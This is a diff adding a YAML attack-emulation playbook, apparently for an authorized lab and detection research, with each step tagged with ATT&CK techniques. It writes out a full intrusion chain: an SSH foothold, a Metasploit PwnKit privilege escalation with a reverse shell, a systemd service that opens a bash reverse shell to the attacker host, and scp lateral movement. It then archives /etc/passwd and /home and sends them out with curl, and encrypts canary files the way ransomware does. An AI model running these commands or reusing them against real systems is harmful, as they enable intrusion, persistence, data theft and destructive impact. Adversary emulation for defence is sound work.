@@ -1,0 +1,63 @@
+###
+# L4 — systemd-service persistence + archive exfil. Split: VALIDATION.
+# AUTHORIZED LAB ONLY. Written, not executed.
+vars:
+  $VICTIM1: 172.31.250.228
+  $VICTIM2: 172.31.250.208
+  $ATTACKER: 172.31.250.253
+  $WEBUSER: www-data
+  $SVC_PASS: CHANGE_ME_lab_service_pw
+  $LABUSER: kltn
+  $CANARY: /opt/kltn-canary
+
+commands:
+  - type: ssh
+    cmd: "id\n"
+    hostname: $VICTIM1
+    username: $WEBUSER
+    password: $SVC_PASS
+    creates_session: foothold
+    metadata: { description: "assume-breach foothold", techniques: "T1190,T1078.003", tactics: "Initial Access" }
+
+  - type: ssh
+    cmd: "whoami; id; uname -a; ip a; ss -tnp\n"
+    session: foothold
+    metadata: { description: "host/net discovery", techniques: "T1082,T1016,T1049", tactics: "Discovery" }
+
+  - type: msf-module
+    cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+    session: foothold
+    creates_session: root
+    exit_on_error: False
+    options: { WRITABLE_DIR: /tmp }
+    payload_options: { LHOST: $ATTACKER, LPORT: 4458 }
+    payload: linux/x64/shell/reverse_tcp
+    metadata: { description: "PwnKit LPE", techniques: "T1068", tactics: "Privilege Escalation" }
+
+  # systemd service persistence (needs root from privesc)
+  - type: msf-session
+    session: root
+    write: True
+    cmd: "printf '[Unit]\\nDescription=sync\\n[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/$ATTACKER/4468 0>&1\"\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/kltn-sync.service; systemctl daemon-reload; systemctl enable kltn-sync.service"
+    exit_on_error: False
+    metadata: { description: "systemd service persistence", techniques: "T1543.002", tactics: "Persistence", telemetry: "filemod /etc/systemd/system; systemctl execve" }
+
+  # lateral via scp (copy a tool across)
+  - type: ssh
+    cmd: "scp -o StrictHostKeyChecking=no /etc/os-release $LABUSER@$VICTIM2:/tmp/.probe 2>/dev/null; echo done\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "scp lateral to VICTIM2", techniques: "T1021.004,T1570", tactics: "Lateral Movement" }
+
+  # collection + exfil
+  - type: ssh
+    cmd: "tar czf /tmp/l.tgz /etc/passwd /home 2>/dev/null; curl -s --data-binary @/tmp/l.tgz http://$ATTACKER/x || true; rm -f /tmp/l.tgz\n"
+    session: foothold
+    metadata: { description: "archive + exfil", techniques: "T1560.001,T1041", tactics: "Collection,Exfiltration", telemetry: "tar; curl -> $ATTACKER" }
+
+  # impact: reversible canary encryption
+  - type: ssh
+    cmd: "sudo mkdir -p $CANARY && for i in $(seq 1 40); do echo d$i > $CANARY/f$i.txt; done; for f in $CANARY/*.txt; do openssl enc -aes-256-cbc -pbkdf2 -k labkey -in \"$f\" -out \"$f.enc\" && rm -f \"$f\"; done\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "reversible canary encryption", techniques: "T1486", tactics: "Impact", telemetry: "burst filemod under $CANARY" }
